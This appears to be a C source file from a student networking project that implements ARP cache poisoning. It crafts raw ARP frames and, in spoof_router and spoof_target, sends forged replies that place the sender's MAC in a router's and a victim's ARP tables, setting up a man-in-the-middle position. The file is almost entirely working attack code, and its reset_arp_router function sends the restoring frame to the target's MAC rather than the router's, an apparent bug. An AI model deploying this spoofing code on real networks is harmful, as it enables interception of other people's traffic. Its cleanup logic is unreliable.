
# include <proginfo.h>
# include <arp.h>
# include <ftlibc.h>

# include <inttypes.h>
# include <netinet/if_ether.h>
# include <linux/if_packet.h>
# include <net/if.h>
# include <arpa/inet.h>

# include <string.h>
# include <errno.h>

static void* getipfromstr(const char* strip)
{
    static uint8_t dest[SIZEOFIP];

    ft_memset(dest, 0, SIZEOFIP);

    in_addr_t value = inet_addr(strip);

    ft_memcpy(dest, &value, SIZEOFIP);

    return dest;
}

static void* getmacfromstr(const char* strmac)
{
    static uint8_t dest[SIZEOFMAC];

    ft_memset(dest, 0, SIZEOFMAC);

    return memmaccpy(dest, strmac);
}

static err_t send_arp(int fd, const struct ether_arp *earp,
                      const uint8_t *src_mac, const uint8_t *dest_mac, bool isbroadcast)
{
    ///TODO: Try to to this within if_nametoindex

    struct sockaddr_ll sll = (struct sockaddr_ll){
        .sll_family = AF_PACKET,
        .sll_protocol = htons(ETH_P_ARP),
        .sll_ifindex = if_nametoindex("eth0"),
        .sll_hatype = htons(ARPHRD_ETHER),
        .sll_pkttype = isbroadcast ? PACKET_BROADCAST : PACKET_OTHERHOST,
        .sll_halen = SIZEOFMAC,
        .sll_addr = {0}
    };

    //printf("[DEBUG] eth0 ifindex is: %d\n", sll.sll_ifindex);

    ft_memcpy(sll.sll_addr, src_mac, SIZEOFMAC);

    uint8_t buff[sizeof(struct ethhdr) + sizeof(*earp)] = {0};

    struct ethhdr *const eth = (struct ethhdr *)buff;

    *eth = (struct ethhdr){
        .h_proto = htons(ETH_P_ARP)
    };

    ft_memcpy(eth->h_source, src_mac, SIZEOFMAC);
    ft_memcpy(eth->h_dest, dest_mac, SIZEOFMAC);

    // printf("[DEBUG] src mac: ");
    // PRINT_MAC(eth->h_source, false);
    // printf(" dest mac: ");
    // PRINT_MAC(eth->h_dest, true);

    struct ether_arp *earp_buffptr = (struct ether_arp *)(buff + sizeof(*eth));
    *earp_buffptr = *earp;

    const ssize_t sentbytes = sendto(fd, buff, sizeof(struct ethhdr) + sizeof(*earp), 0, (struct sockaddr*)&sll, sizeof(sll));

    if (sentbytes < 0)
    {
        printf("%s\n", strerror(errno));
        PRINT_ERROR(MSG_ERROR_SYSCALL, "sendto");
        return INVSYSCALL;
    }

    return SUCCESS;
}

/// Send standart ARP Request to the target, the target should reply.
err_t send_arp_request_to_target(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REQUEST),
    };

    ft_memcpy(earp.arp_sha, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_spa, getipfromstr(info->mymachine.ip), SIZEOFIP);
    ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);

    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
    getmacfromstr(info->mymachine.mac), ETHER_BROADCAST_MAC, true);
}

/// Send standart ARP Request to the router, the router should reply.
err_t send_arp_request_to_router(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REQUEST),
    };

    ft_memcpy(earp.arp_sha, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_spa, getipfromstr(info->mymachine.ip), SIZEOFIP);
    ft_memcpy(earp.arp_tpa, getipfromstr(info->router.ip), SIZEOFIP);

    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
    getmacfromstr(info->mymachine.mac), ETHER_BROADCAST_MAC, true);
}

/// Send standart ARP Reply to target
err_t send_arp_reply_to_target(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(earp.arp_sha, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_spa, getipfromstr(info->mymachine.ip), SIZEOFIP);
    ft_memcpy(earp.arp_tha, getmacfromstr(info->target.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);

    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
    getmacfromstr(info->mymachine.mac), getmacfromstr(info->target.mac), false);
}

/// Spoof my MAC address into router's ARP table at target's ip index.
err_t spoof_router(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(earp.arp_sha, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_spa, getipfromstr(info->target.ip), SIZEOFIP);
    ft_memcpy(earp.arp_tha, getmacfromstr(info->router.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, getipfromstr(info->router.ip), SIZEOFIP);

    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
    getmacfromstr(info->mymachine.mac), getmacfromstr(info->target.mac), false);
}

/// Spoof my MAC address into target's ARP table at router's ip index.
err_t spoof_target(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(earp.arp_sha, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_spa, getipfromstr(info->router.ip), SIZEOFIP);
    ft_memcpy(earp.arp_tha, getmacfromstr(info->target.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);

    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
    getmacfromstr(info->mymachine.mac), getmacfromstr(info->router.mac), false);
}

/// Remove my spoofed MAC address from target's ARP table (at router's ip index)
err_t reset_arp_target(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(earp.arp_sha, getmacfromstr(info->router.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_spa, getipfromstr(info->router.ip), SIZEOFIP);
    ft_memcpy(earp.arp_tha, getmacfromstr(info->target.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);

    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
    getmacfromstr(info->router.mac), getmacfromstr(info->target.mac), false);
}

/// Remove my spoofed MAC address from router's ARP table (at target's ip index)
err_t reset_arp_router(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(earp.arp_sha, getmacfromstr(info->target.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_spa, getipfromstr(info->target.ip), SIZEOFIP);
    ft_memcpy(earp.arp_tha, getmacfromstr(info->router.mac), SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, getipfromstr(info->router.ip), SIZEOFIP);

    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
    getmacfromstr(info->target.mac), getmacfromstr(info->target.mac), false);
}
